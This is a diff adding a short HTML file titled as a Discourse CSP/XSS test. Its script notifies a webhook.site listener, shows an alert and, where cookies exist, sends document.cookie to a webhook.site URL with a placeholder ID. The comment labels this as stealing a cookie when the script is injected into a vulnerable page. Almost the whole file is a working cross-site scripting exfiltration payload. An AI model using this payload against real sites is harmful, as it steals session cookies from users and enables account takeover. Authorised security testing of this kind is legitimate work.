@@ -1,0 +1,21 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Discourse CSP/XSS Test</title>
+  <script>
+    // Notify your listener
+    fetch("https://webhook.site/YOUR_UNIQUE_ID?ts=" + Date.now());
+
+    // Display clear test success
+    alert("✅ Test script executed!");
+    
+    // Steal a test cookie (if injected in a vulnerable page)
+    if (document.cookie) {
+      fetch("https://webhook.site/YOUR_UNIQUE_ID?cookie=" + encodeURIComponent(document.cookie));
+    }
+  </script>
+</head>
+<body>
+  <h1>Test executed</h1>
+</body>
+</html>
